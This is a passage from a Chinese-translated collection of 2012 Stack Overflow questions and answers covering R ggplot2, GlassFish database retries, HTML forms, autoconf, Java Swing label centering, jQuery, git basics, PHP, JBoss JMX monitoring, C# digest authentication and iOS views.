1/2/2010 K     56
1/2/2010 K     60
1/2/2010 M     15 
```

ETC

我想用 ggplot2 绘制该时间段内得分最高的 5 支球队和最低 5 支（得分最低的球队）的图表。

用ggplot做到这一点是否可行？我可以绘制所有球队的图表，但由于我有很多球队，我希望能够查看最高得分者和低得分者。

任何意见将不胜感激？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T23:25:22.813

假设您的数据被命名`dat`为开头，这种基本方法应该有效：

```
library(ggplot2)
library(plyr)

#summarize and subset
plotdat <- ddply(dat, "Team", summarize, meanval = mean(Score))
plotdat <- plotdat[order(plotdat$meanval),]
plotdat <- rbind(head(plotdat,5), tail(plotdat,5))

#Plot
ggplot(plotdat, aes(reorder(Team, meanval), meanval)) + 
  geom_bar() +
  coord_flip() +
  xlab("Team") +
  theme_bw() 
```

![在此处输入图像描述](../Images/51dbd3f142ba84b3a9fdf7f089b478eb.png)

# mysql - 如何阻止 glassfish 在部署期间尝试连接到已关闭的数据库集群节点？

> ID：10658180
> 
> 赞同：0
> 
> 时间：2012-05-18T18:50:12.217
> 
> 标签：mysql, spring, hibernate, glassfish

我正在使用 spring、Glassfish、hibernate 和 MySQL 开发一个 Web 应用程序。我有一个带有 3 个节点的 MySQL 集群。应用程序知道用户访问它的位置，并将数据库查询分派到适当的节点。我想实现一些数据库容错，这意味着当一个节点关闭时，应用程序会将查询重定向到最近的活动节点。一切运行良好，但是当我尝试部署并且一个节点已关闭时遇到问题。Glassfish 尝试连接到已关闭的节点，但显然没有成功。但它会继续尝试几分钟。这是我在日志中得到的异常：

```
[#|2012-05-18T21:26:21.557+0300|INFO|glassfish3.1.2|javax.enterprise.system.std.com.sun.enterprise.server.logging|_ThreadID=102;_ThreadName=Thread-2;|18.05.2012 21:26:21 DEBUG (BasicResourcePool.java:1831) - An exception occurred while acquiring a poolable resource. Will retry.
com.mysql.jdbc.exceptions.jdbc4.CommunicationsException: Communications link failure

The last packet sent successfully to the server was 0 milliseconds ago. The driver has not received any packets from the server.
at sun.reflect.GeneratedConstructorAccessor128.newInstance(Unknown Source)
at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
at java.lang.reflect.Constructor.newInstance(Constructor.java:525)
at com.mysql.jdbc.Util.handleNewInstance(Util.java:411)
at com.mysql.jdbc.SQLError.createCommunicationsException(SQLError.java:1116)
at com.mysql.jdbc.MysqlIO.<init>(MysqlIO.java:344)
at com.mysql.jdbc.ConnectionImpl.coreConnect(ConnectionImpl.java:2333)
at com.mysql.jdbc.ConnectionImpl.connectOneTryOnly(ConnectionImpl.java:2370)
at com.mysql.jdbc.ConnectionImpl.createNewIO(ConnectionImpl.java:2154)
at com.mysql.jdbc.ConnectionImpl.<init>(ConnectionImpl.java:792)
at com.mysql.jdbc.JDBC4Connection.<init>(JDBC4Connection.java:47)
at sun.reflect.GeneratedConstructorAccessor125.newInstance(Unknown Source)
at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
at java.lang.reflect.Constructor.newInstance(Constructor.java:525)
at com.mysql.jdbc.Util.handleNewInstance(Util.java:411)
at com.mysql.jdbc.ConnectionImpl.getInstance(ConnectionImpl.java:381)
at com.mysql.jdbc.NonRegisteringDriver.connect(NonRegisteringDriver.java:305)
at com.mchange.v2.c3p0.DriverManagerDataSource.getConnection(DriverManagerDataSource.java:134)
at com.mchange.v2.c3p0.WrapperConnectionPoolDataSource.getPooledConnection(WrapperConnectionPoolDataSource.java:182)
at com.mchange.v2.c3p0.WrapperConnectionPoolDataSource.getPooledConnection(WrapperConnectionPoolDataSource.java:171)
at com.mchange.v2.c3p0.impl.C3P0PooledConnectionPool$1PooledConnectionResourcePoolManager.acquireResource(C3P0PooledConnectionPool.java:137)
at com.mchange.v2.resourcepool.BasicResourcePool.doAcquire(BasicResourcePool.java:1014)
at com.mchange.v2.resourcepool.BasicResourcePool.access$800(BasicResourcePool.java:32)
at com.mchange.v2.resourcepool.BasicResourcePool$AcquireTask.run(BasicResourcePool.java:1810)
at com.mchange.v2.async.ThreadPoolAsynchronousRunner$PoolThread.run(ThreadPoolAsynchronousRunner.java:547)
Caused by: java.net.ConnectException: Connection refused: connect
at java.net.DualStackPlainSocketImpl.connect0(Native Method)
at java.net.DualStackPlainSocketImpl.socketConnect(DualStackPlainSocketImpl.java:69)
at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:337)
at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:198)
at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:180)
at java.net.PlainSocketImpl.connect(PlainSocketImpl.java:157)
at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:391)
at java.net.Socket.connect(Socket.java:579)
at java.net.Socket.connect(Socket.java:528)
at java.net.Socket.<init>(Socket.java:425)
at java.net.Socket.<init>(Socket.java:241)
at com.mysql.jdbc.StandardSocketFactory.connect(StandardSocketFactory.java:257)
at com.mysql.jdbc.MysqlIO.<init>(MysqlIO.java:294)
... 19 more
|#] 
```

我尝试设置一些与连接测试相关的休眠属性，但没有效果。是否有超时属性或我可以设置的一些布尔属性，以便我可以更快地部署？这些是我目前正在使用的数据源属性：

```
 <property name="driverClass" value="com.mysql.jdbc.Driver"/>
    <property name="user" value="user"/>
    <property name="password" value="password"/>
    <property name="maxPoolSize" value="10"/>
    <property name="maxStatements" value="0"/>
    <property name="minPoolSize" value="5"/>
    <property name="testConnectionOnCheckin" value="false"/>
    <property name="testConnectionOnCheckout" value="false"/> 
```

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-19T10:12:14.433

我设法通过反复试验找到了我正在寻找的财产：

```
<property name="acquireRetryAttempts" value="1"/> 
```

# html - 测试表格提交

> ID：10658186
> 
> 赞同：-2
> 
> 时间：2012-05-18T18:50:29.963
> 
> 标签：html

我正在设置一个 FORM 并且需要在不处理 php 的情况下对其进行测试...如何使提交底部带我到下一个 padro

```
<form action="test.html" method="POST" id="acct_access">
...
</form> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T18:55:59.293

如果您想进行一些客户端验证（希望我得到正确的问题），您需要扩展表单的 onsubmit 事件：

HTML

```
<form action="test.html" method="POST" id="acct_access" onsubmit="validateForm();">
    ...
</form> 
```

JavaScript：

```
function validateForm () {
    //do your validation here

    //you need to return 'true' if everything is valid
    //or 'false' if something went wrong - this will not make the POST call
    return true;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T19:00:39.640

您需要更改`action`指向新文件的指向。

```
<form action="access.html" method="POST" id="acct_access">
...
</form> 
```

或者，在 php 文件中，编写一些简短的绕过代码，将用户转到后续页面。

```
<?php
    header( 'Location: access.html' ) ;
?> 
```

# c++ - 在配置期间找到了库，但没有找到

> ID：10658187
> 
> 赞同：0
> 
> 时间：2012-05-18T18:50:34.543
> 
> 标签：c++, autoconf, automake

我正在尝试使用 automake 和 autotools 捆绑一个小型 C++ 程序。在我当前的设置中，所需的库安装在脚本能够找到的位置，但在从 make`configure`调用时找不到。`g++`

`-I`我可以通过在调用时传入相关选项来解决此问题`configure`（以便将正确的包含路径传递给编译器），但我希望`configure`脚本在找不到库时`make`也无法找到它。

或者，我希望配置脚本生成必要的`-I`命令，以便编译器找到它需要的一切。

有没有一些标准的方法来做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T09:19:03.380

您的配置脚本可能已损坏，或者您对配置输出的解释：

如果您在配置期间的库检查检查它是否可以*链接*到某个库，这决不能保证您具有可用（或可找到）编译所需的头文件。

因此，您应该为您的 configure.ac 添加对库和标头的检查

```
AC_CHECK_LIB([foo], [foo_init])
AC_CHECK_HEADERS([foo.h]) 
```

并且仅假设您可以在 lib 和标头都存在的情况下进行构建。

如果找不到标头并且您知道它们在哪里，则可以添加这些路径（在配置中）并重新运行测试。鉴于您必须添加非常标准的路径（'/usr/local/include' 无论如何都应该是自动搜索路径的一部分；'/sw/include' 是 fink 的一部分，所以你应该确保你初始化了你的通过运行正确的系统

```
$ . /sw/bin/init.sh 
```

在尝试运行 ./configure 之前，在终端中（省略“$”）

# java - 仅包含文本的 JLabel 如何在 JPanel 中对齐？

> ID：10658189
> 
> 赞同：1
> 
> 时间：2012-05-18T18:50:42.267
> 
> 标签：java, swing, jpanel, jlabel

通常，我只会`JLabel`使用字符串作为第一个参数和`JLabel.CENTER`第二个参数来创建；使用将标签添加到面板`BorderLayout.CENTER`会导致标签中的文本在面板的中心对齐。

但是，我正在使用“RichJLabel”类来在我的文本上添加阴影。为此，它会`Component.paintComponent`以丢失对齐信息的方式覆盖，并且无论我做什么，标签的文本都会绘制在面板的左上角。

据我了解，解决方法是将标签封装在另一个面板内；这样，我可以在父面板内对齐面板本身，但我不确定如何做到这一点。

我的完整目标是：

*   找出给定字符串需要什么字体大小才能填充其父 JPanel
*   为该文本添加阴影
*   在其 JPanel 中居中文本

这是我到目前为止所得到的：

```
import java.awt.*;
import javax.swing.*;
import javax.swing.border.BevelBorder;

public class RichJLabel extends JLabel {

    private int tracking;

    public RichJLabel(String text, int tracking) {
        super(text, JLabel.CENTER);
        this.tracking = tracking;
    }

    private int left_x, left_y, right_x, right_y;
    private Color left_color, right_color;

    public void setLeftShadow(int x, int y, Color color) {
        left_x = x;
        left_y = y;
        left_color = color;
    }

    public void setRightShadow(int x, int y, Color color) {
        right_x = x;
        right_y = y;
        right_color = color;
    }

    public Dimension getPreferredSize() {
         String text = getText();
         FontMetrics fm = this.getFontMetrics(getFont());

         int w = fm.stringWidth(text);
         w += (text.length()-1)*tracking;
         w += left_x + right_x;
         int h = fm.getHeight();
         h += left_y + right_y;

         return new Dimension(w,h); 
}

public void paintComponent(Graphics g) {

        ((Graphics2D)g).setRenderingHint(
            RenderingHints.KEY_TEXT_ANTIALIASING,
            RenderingHints.VALUE_TEXT_ANTIALIAS_ON);
        char[] chars = getText().toCharArray();

        FontMetrics fm = this.getFontMetrics(getFont());

        int h = fm.getAscent();
        int x = 0;

        for(int i=0; i<chars.length; i++) {
            char ch = chars[i];
            int w = fm.charWidth(ch) + tracking;

            g.setColor(left_color);
            g.drawString(""+chars[i],x-left_x,h-left_y);

            g.setColor(right_color);
            g.drawString(""+chars[i],x+right_x,h+right_y);

            g.setColor(getForeground());
            g.drawString(""+chars[i],x,h);

            x+=w;
    }

        ((Graphics2D)g).setRenderingHint(
            RenderingHints.KEY_TEXT_ANTIALIASING,
            RenderingHints.VALUE_TEXT_ANTIALIAS_DEFAULT);

    } // end paintComponent()

public static void main(String[] args) {

  JPanel panel1 = new JPanel( new BorderLayout() );
  panel1.setBackground( Color.BLUE );
  panel1.setBorder( BorderFactory.createBevelBorder( BevelBorder.LOWERED ));

  JPanel interiorPanel = new JPanel( new BorderLayout() );
  panel1.add(interiorPanel, BorderLayout.CENTER);
  RichJLabel label = new RichJLabel("100", 0);
  label.setHorizontalAlignment(JLabel.CENTER);
  label.setVerticalAlignment(JLabel.CENTER);
  label.setVisible( true );
  label.setForeground( Color.YELLOW );

  interiorPanel.add(label, BorderLayout.CENTER);
  label.setFont(new Font("Arial", Font.BOLD, 140));
  label.setFont(label.getFont().deriveFont(140f));

  //resize code
  Font labelFont = label.getFont();
  String labelText = label.getText();
  int stringWidth = label.getFontMetrics(labelFont).stringWidth(labelText);
  int componentWidth = interiorPanel.getWidth();

  // Find out how much the font can grow in width.
  double widthRatio = (double)componentWidth / (double)stringWidth;
  int newFontSize = (int)(labelFont.getSize() * widthRatio);
  int componentHeight = interiorPanel.getHeight();

  // Pick a new font size so it will not be larger than the height of label.
  int fontSizeToUse = Math.min(newFontSize, componentHeight);
  // Set the label's font size to the newly determined size.
  label.setFont(new Font(labelFont.getName(), Font.BOLD, fontSizeToUse));
  label.setLeftShadow(-3,-3,Color.BLACK);     

  // drop shadow w/ highlight
  label.setRightShadow(2,3,Color.black);
  label.setForeground(Color.gray);

  JFrame frame = new JFrame("Label SSCCEE");
  frame.getContentPane().add(panel1);
  frame.pack();
  frame.setVisible(true);
 }
} 
```

它现在所做的是：

![蓝色面板内的灰色框](../Images/f5033b9f46cf043ed6d804e5da98c8ec.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-18T22:06:04.030

代码过早地检查容器的大小。在显示之前，它的宽度/高度为 0。

![带阴影的文字](../Images/088d105ecfa3999a1903a0b947872363.png)

## 修改后的代码

```
import java.awt.*;
import javax.swing.*;
import javax.swing.border.BevelBorder;

public class RichJLabel extends JLabel {

    private int tracking;

    public RichJLabel(String text, int tracking) {
        super(text, JLabel.CENTER);
        this.tracking = tracking;
    }

    private int left_x, left_y, right_x, right_y;
    private Color left_color, right_color;

    public void setLeftShadow(int x, int y, Color color) {
        left_x = x;
        left_y = y;
        left_color = color;
    }

    public void setRightShadow(int x, int y, Color color) {
        right_x = x;
        right_y = y;
        right_color = color;
    }

    public Dimension getPreferredSize() {
         String text = getText();
         FontMetrics fm = this.getFontMetrics(getFont());

         int w = fm.stringWidth(text);
         w += (text.length()-1)*tracking;
         w += left_x + right_x;
         int h = fm.getHeight();
         h += left_y + right_y;

         return new Dimension(w,h);
}

public void paintComponent(Graphics g) {

        ((Graphics2D)g).setRenderingHint(
            RenderingHints.KEY_TEXT_ANTIALIASING,
            RenderingHints.VALUE_TEXT_ANTIALIAS_ON);
        char[] chars = getText().toCharArray();

        FontMetrics fm = this.getFontMetrics(getFont());

        int h = fm.getAscent();
        int x = 0;

        for(int i=0; i<chars.length; i++) {
            char ch = chars[i];
            int w = fm.charWidth(ch) + tracking;

            g.setColor(left_color);
            g.drawString(""+chars[i],x-left_x,h-left_y);

            g.setColor(right_color);
            g.drawString(""+chars[i],x+right_x,h+right_y);

            g.setColor(getForeground());
            g.drawString(""+chars[i],x,h);

            x+=w;
    }

        ((Graphics2D)g).setRenderingHint(
            RenderingHints.KEY_TEXT_ANTIALIASING,
            RenderingHints.VALUE_TEXT_ANTIALIAS_DEFAULT);

    } // end paintComponent()

public static void main(String[] args) {

  JPanel panel1 = new JPanel( new BorderLayout() );
  panel1.setBackground( Color.BLUE );
  panel1.setBorder( BorderFactory.createBevelBorder( BevelBorder.LOWERED ));

  JPanel interiorPanel = new JPanel( new BorderLayout() );
  panel1.add(interiorPanel, BorderLayout.CENTER);
  RichJLabel label = new RichJLabel("100", 0);
  label.setLeftShadow(-3,-3,Color.BLACK);

  // drop shadow w/ highlight
  label.setRightShadow(2,3,Color.black);

  label.setHorizontalAlignment(JLabel.CENTER);
  label.setVerticalAlignment(JLabel.CENTER);
  label.setVisible( true );
  label.setForeground( Color.YELLOW );

  interiorPanel.add(label, BorderLayout.CENTER);
  label.setFont(new Font("Arial", Font.BOLD, 140));
  label.setFont(label.getFont().deriveFont(140f));

  //resize code
  Font labelFont = label.getFont();

  JFrame frame = new JFrame("Label SSCCEE");
  frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
  frame.setContentPane(panel1);
  frame.pack();
  frame.setVisible(true);

  int componentWidth = interiorPanel.getWidth();
  String labelText = label.getText();
  int stringWidth = label.getFontMetrics(labelFont).stringWidth(labelText);
  // Find out how much the font can grow in width.
  double widthRatio = (double)componentWidth / (double)stringWidth;
  int newFontSize = (int)(labelFont.getSize() * widthRatio);
  int componentHeight = interiorPanel.getHeight();

  // Pick a new font size so it will not be larger than the height of label.
  int fontSizeToUse = Math.min(newFontSize, componentHeight);
  System.out.println("fontSizeToUse: " + fontSizeToUse);
  if (fontSizeToUse<1) {
      System.err.println("Font size less than 1!");
      System.exit(1);
  }

  // Set the label's font size to the newly determined size.
  label.setFont(new Font(labelFont.getName(), Font.BOLD, fontSizeToUse));
  label.setForeground(Color.gray);
 }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T19:03:22.983

如果是这个[RichJLabel](http://code.google.com/p/filthy-rich-clients/source/browse/trunk/swing-hacks-examples-20060109/Ch01-JComponents/02/RichJLabel.java?r=7)，那就看看吧`paintComponent`。我建议制作自己的阴影标签，可能由两个阴影标签和一个前景标签组成。没想到每个角色都画了3遍。有问题的：效率低下，不能使用像阿拉伯语这样的脚本语言或组合变音符号（一个字符字母，另一个重音）。

在某些时候，到处乱砍是不值得的。如果你看过消息来源，谁知道呢。

*我不确定我是否有正确的代码。它当然可能是一个非常早期的版本。*

* * *

RichJLabel 有一个`getPreferredSize()`适合布局。`JPanel.setBounds(int, int, int, int)`是调整大小的唯一方法。因此，您可以在 JPanel 中使用绝对布局（空布局）。

```
public class EPanel2 extends JPanel {

    private RichJLabel label = new RichJLabel("", 0);
    public EPanel2(String text) {
        super(null);
        setBackground(Color.GREEN.brighter().brighter());

        label.setFont(new Font("Univers", Font.BOLD, 48));
        label.setText(text);
        label.setHorizontalAlignment(JLabel.CENTER);
        label.setVerticalAlignment(JLabel.CENTER);
        label.setForeground(Color.BLUE);
        label.setLeftShadow(2, 2, Color.RED);
        label.setRightShadow(2, 2, Color.ORANGE);
        label.setVisible(true);
        add(label);
    }

    @Override
    public void setBounds(int x, int y, int width, int height) {
        super.setBounds(x, y, width, height);
        Dimension labelSize = label.getPreferredSize();
        int labelX = (width - labelSize.width) / 2;
        int labelY = (height - labelSize.height) / 2;
        label.setBounds(labelX, labelY, labelSize.width, labelSize.height);
    }

} 
```

# javascript - 尝试不包含某些内容时，jquery选择器不起作用

> ID：10658194
> 
> 赞同：0
> 
> 时间：2012-05-18T18:50:55.310
> 
> 标签：javascript, jquery, html, jquery-selectors

当我单击 tr 时，我正在尝试做一个 slideToggle，它扩展了一些隐藏的内容。目前，当我这样做时，它会快门/闪烁，打开和关闭 4 次。我正在尝试这样做，以便除 div#bounds 之外的所有子项（以及关联，它的所有子项）都将获得该 onclick 属性。

```
<tr id="attr_expander"><th>Alignment</th><td><input class="attribute" type ="text" disabled="true" />
    <div id="bounds">
       <label><input type="radio" name="toggle" value = "1"><span></span></label>
       <label><input type="radio" name="toggle" value="2"><span></span></label>
       <label><input type="radio" name="toggle" value = "4"><span></span></label><br />
       <label><input type="radio" name="toggle"value = "16"><span></span></label>
       <label><input type="radio" name="toggle"value = "32"><span></span></label>
       <label><input type="radio" name="toggle"value = "64"><span></span></label><br />
       <label><input type="radio" name="toggle"value = "256"><span></span></label>
       <label><input type="radio" name="toggle"value = "512"><span></span></label>
       <label><input type="radio" name="toggle"value = "1024"><span></span></label>
    </div> 
```

​​​

jQuery是：

```
$("#attr_expander").find("*:not(div[id='bounds'])").click(function () {
    $("#bounds").slideToggle();
}); 
```

css 让事情看起来更好一点：

```
#bounds {
    margin:4px;
    background-color:#EFEFEF;
    border-radius:4px;
    border:1px solid #D0D0D0;
    overflow:auto;
    float:left;
}

#bounds label {
    float:left;
    width:2.25em;
    height:3.0em;
    border: 1px solid black;
}

#bounds label span {
    text-align:center;
    padding:3px 0px;
    display:block;

    width:2.25em;
    height:2.75em;
}

#bounds label span:hover
{
    background-color:Aqua;
    border: 1px solid black;
}

#bounds label input {
    position:absolute;
    top:-20px;
}

#bounds input:checked + span {
    background-color:#404040;
    color:#F7F7F7;
}​ 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T19:06:39.283

您不能只检查单击事件的目标是什么，并且仅在节点名是表格单元格时才进行切换？

```
$("#attr_expander").click(function (e) {
    if((e.target.nodeName)=="TH" || (e.target.nodeName)=="TD") $("#bounds").slideToggle();
});​ 
```

**[jsFiddle 示例](http://jsfiddle.net/j08691/G3tnQ/1/)**。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T18:55:08.080

```
$("#attr_expander").find('*').not('#bounds, #bounds *').click(function () {
    $("#bounds").slideToggle();
}); 
```

[**工作示例**](http://jsfiddle.net/thecodeparadox/ntXjQ/2/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-18T19:23:02.593

您可以只绑定到元素，然后检查是否`#bounds`是父母之一。这样，您只绑定一个事件侦听器，而不是每个元素一个。

[http://jsfiddle.net/G3tnQ/3/](http://jsfiddle.net/G3tnQ/3/)

```
$("#attr_expander").on('click', function (e) {
    var bounds = '#bounds',
        $target = $(e.target);

    if (!$target.is(bounds) && $target.closest(bounds).length === 0) {
        $(bounds).slideToggle();
    }
});​ 
```

# git - 简单的 GIT 命令序列

> ID：10658195
> 
> 赞同：7
> 
> 时间：2012-05-18T18:50:56.540
> 
> 标签：git, github, command, push, commit

我阅读了文档并在 Google 上搜索了一番，但没有真正简单的步骤可以将本地更改提交到 github。我编译了以下步骤，我只是想确保做正确的事情。如果我在本地更改了文件 foo.java：

> 1.  git status -s //会告诉我 foo.java 已经改变了
>     
>     
> 2.  git add foo.java //将它添加到我的本地仓库
>     
>     
> 3.  git commit -m "my changes" //提交到本地仓库
>     
>     
> 4.  git tag "v1.1" //创建标签
>     
>     
> 5.  git push --tags //最后，将本地提交移动到带有新标签的远程仓库。这将提示您输入密码。如果没有像第 4 步那样设置标签，那么只需
>     
>     
> 
> > git 推送

足够。对？

我只是想确保大多数用例的这些基本步骤是使用 github 所需的。我是 github 的新手，这些步骤对我有用，但要确保我没有犯任何根本性的错误。如果有任何遗漏的步骤，请发表评论。同样，我关心最通用的日常使用（例如，我并不真正关心分支等，我将根据需要学习）。先感谢您。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-18T20:29:45.747

你的步骤很好。不过，稍微挑剔一下评论：

关于步骤 (2) 和 (3) 的评论并不是思考正在发生的事情的最佳方式，我不相信。

```
2.git add foo.java     //will add it to my local repo
3.git commit -m "my changes"      //commit to the local repo 
```

将文件“添加”*到本地存储库*的步骤是`git-commit`. 这就是为什么它被称为`commit`; 您将更改*提交*到存储库。`git-add foo`添加`foo`到*staging area*，**而不是**repo 本身。

您的`git`存储库有三个“区域”、`working`和`staging`，`repository`如下所示（图片取自[Pro Git 书籍](http://git-scm.com/book/en/Getting-Started-Git-Basics)）：

![Git 区域](../Images/736782c8ad8eb206d557133bbbcd36dc.png)

您进行更改并在创造性地命名的“工作目录”中工作。

当您进行了一些更改后，您想要准备提交。这就是“暂存区”发挥作用的地方。您“暂存”您想要提交的更改，当您对提交的外观感到满意时，您将“暂存区域”提交到“存储库”。[注意：在`man`页面中，这`staging area`主要是指`index`]。

这为您提供了很大的灵活性。您可以暂存自上次提交以来的所有更改，也可以单独暂存文件，也可以暂存部分文件。您可以在暂存区域添加和删除文件，而不会丢失更改或弄乱存储库历史记录。这就是`git add`and`git rm`命令的作用；他们从 中添加`working directory`到 中`staging area`，但**不**直接添加到 中`repository`。（希望图像有助于清楚区分）。

你的步骤很好。如果你想了解更多关于分支、提交、操作提交和分支等等，我建议阅读[Pro Git 书](http://git-scm.com/book)——它有一大堆漂亮的图片和简单的语言，我可以理解；）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-18T20:27:05.607

我认为这对于非常基本的用法已经足够了。我只想添加两条评论：

*   检查您要添加到暂存区域的内容（这是您正在使用的内容`git add`）总是一件好事：要么使用`git diff`，要么执行 a `git add --patch`，这将启动一个交互式过程，让您决定是接受还是拒绝每个您修改的大量代码。如果您在此阶段搞砸了任何事情，您可以随时`git reset HEAD`将更改返回到工作副本（即，您只需撤消添加）
*   您可能希望通过发出`git commit -a -m 'your message'`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-18T18:53:33.073

在 (3) 之后，您应该可以调用`git push origin master`which 会将您当前的`master`分支推送到 github

# php - 检查php mysql查询结果列是否为空

> ID：10658198
> 
> 赞同：1
> 
> 时间：2012-05-18T18:51:02.797
> 
> 标签：php

我正在从数据库中打印出一张包含 27 列的表格，因此很明显，如果在我的屏幕上可以看到 27 列，这将在美学上令人不快。所以这是我一直用来查看特定 col 是否为空的条件之一，如果它为空，则不会打印表头，如果没有打印另一个 if isset 条件将不会打印表数据。但它并没有按计划进行。这些是我尝试过的变体，但它们都不起作用 PS $result = 查询返回的行数。

```
$i = 1;
while ($i <= $result)

    {
        if (!empty($array['Others'][$i]))
            {

                $others = print "<th>Others</th>";
                break;
            }
        $i++;
    }

$i = 0;
    while ($i <= $result)
    {
        $emptyothers = !empty($array['Others'][$i]);

        if ($emptyothers == '1')
            {

                $others= print "<th>Others</th>";
                break;
            }
        $i++;
    } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-18T19:01:15.307

Your code should be like this:

```
$sql = mysql_query("SELECT * FROM table");
if (mysql_num_rows($sql) > 0) {
    //your code...
} else {
    print 'is empty';
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T19:03:33.997

你能用`array_key_exists()`吗？

```
foreach($row in $result) {
    if(array_key_exists('Others', $row)) {
        if(!empty($row['Others']) {
            print "<th>Others</th>";
            break;
        }
    }
} 
```

# jboss - 在不调整 log4j.xml 的情况下记录 jboss

> ID：10658201
> 
> 赞同：0
> 
> 时间：2012-05-18T18:51:07.810
> 
> 标签：jboss, log4j, jmx

我们正在运行带有 JBoss 的服务器，并使用 log4j 来查找错误。我被要求想出一种方法来记录诸如空闲内存和活动线程组计数之类的东西，这样我们就可以监视这些，而不必通过 jboss 控制台。但是，有人告诉我，如果我能做到这一点而不必对现有服务器进行任何更改，那将是首选。我最初的想法是更改 log4j.xml 以将相关数据保存到数据库中以便稍后解析并显示，但是现在我真的不知道。有没有其他方法，无需安装 3rd 方应用程序，自动从 jboss 服务器获取信息并保存它？还是我应该继续争取被允许修改 log4j xml？另外，这甚至可能吗？我'

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T19:47:58.310

猎人;

假设没有网络障碍并且没有以任何方式禁用 JMX 远程处理，您可以使用 JMX API 远程监控这些值。这是执行此操作的一些 Groovy 代码，但您可以轻松地将其转换为 Java。

```
import javax.management.*;
import javax.naming.*;
Properties p = new Properties();
p.put(Context.PROVIDER_URL, url);
p.put(Context.INITIAL_CONTEXT_FACTORY, "org.jnp.interfaces.NamingContextFactory");
p.put("jnp.disableDiscovery", "true");
ctx = new InitialContext(p);
contexts.put(url, ctx);
mbeanServer = ctx.lookup("/jmx/rmi/RMIAdaptor");
// Lookups here 
```

将**/client/jbossall-client.jar**放在你的类路径中。

现在只需滚动浏览 JMXConsole（如果必须在开发服务器上）并选择要收集的属性和 ObjectName。例如，扩展上面的示例，以获得 FreeMemory（又是 groovy）：

```
import javax.management.*;
def objectName = new ObjectName("jboss.system:type=ServerInfo");
def freeMem = mbeanServer.getAttribute(objectName, "FreeMemory"); 
```

在您的 JMXConsole 中，映射到此 MBean：

![在此处输入图像描述](../Images/10a90186b472b63df409574d3cb15d58.png)

以及该 MBean 中的此属性：

![在此处输入图像描述](../Images/f532c96d9cfe9c6a89db20c9321f444a.png)

因此，如果您设置一个调度程序来不时收集这些数据，您可以将其写入数据库、将其放入电子邮件或其他任何方式。

说得通 ？

# c# - HttpRequestMessage 和摘要认证

> ID：10658202
> 
> 赞同：8
> 
> 时间：2012-05-18T18:51:08.480
> 
> 标签：c#, windows-runtime, digest-authentication

是否有任何内置函数可以将摘要身份验证与 winrt 中的 HttpRequestMessage 相关联？还是我必须使用其他课程才能执行此任务？

谢谢。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-05-21T11:46:51.810

我正在使用[`HttpClient`](http://msdn.microsoft.com/en-us/library/system.net.http.httpclient%28v=vs.110%29.aspx)HttpRequest 消息。构造`HttpClient`函数接受 a `HttpClientHandler`，它接受`Credentials`的实例作为属性 [`CredentialCache`](http://msdn.microsoft.com/en-us/library/system.net.credentialcache%28v=vs.110%29.aspx)。A`CredentialCache`应该能够使用摘要身份验证。

代码应该是这样的：

```
var credCache = new CredentialCache();
credCache.Add(new Uri("http://.com/"),"Digest", new NetworkCredential(UserName,SecurelyStoredPassword,Domain));
var httpClient = new HttpClient( new HttpClientHandler { Credentials = credCache});
var answer = httpClient.GetAsync(new Uri("http://request.Uri")); 
```

# c# - 将项目从一个列表视图拖到第二个列表视图

> ID：10658204
> 
> 赞同：0
> 
> 时间：2012-05-18T18:51:14.603
> 
> 标签：c#, winforms

我在 MSDN 论坛上看到了这篇文章，他们说根本不支持。真的吗？

[http://social.msdn.microsoft.com/Forums/en-US/winappswithhtml5/thread/08a012a6-74bf-4ac4-b984-adda3687e6f1](http://social.msdn.microsoft.com/Forums/en-US/winappswithhtml5/thread/08a012a6-74bf-4ac4-b984-adda3687e6f1)

您是否知道任何实际这样做的样本？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T19:04:47.530

我不相信您链接中的帖子指的是 WinForms。在 WinForms 中是可行的；它可能不是很简单 - 见[这里](https://stackoverflow.com/questions/5045427/is-it-possible-to-have-drag-and-drop-from-a-listview-to-a-treeview-in-winforms)

# ios - UIViews 应该有属性吗？

> ID：10658205
> 
> 赞同：1
> 
> 时间：2012-05-18T18:51:14.610
> 
> 标签：ios, model-view-controller, uiview, properties, uiviewcontroller

使用正确的 MCV 和 Objective-C 可以 UIView 子类有@propertys吗？

即在.h文件中

```
@class MyViewSubclass;

@interface MyViewSubclass : UIView
@property (strong, nonatomic) UILabel *labelLabel;
@property (strong, nonatomic) UILabel *valueLabel;
@end 
```

还是应该在 UIViewController 子类中完成？

提前致谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-18T19:14:58.103

最常见的做法是继承 UIViewController 来管理视图层次结构中的标签、字段、图像和其他视图。但是，如果您正在创建一个将在整个应用程序中使用的可重用组件视图，那么将 UIView 子类化并将属性添加到您的子类是非常合适的。

来自 Apple 的 iOS 应用程序编程指南：

> 视图控制器对象管理应用内容在屏幕上的呈现。视图控制器管理单个视图及其子视图集合。呈现时，视图控制器通过将其安装在应用程序的窗口中来使其视图可见。
> 
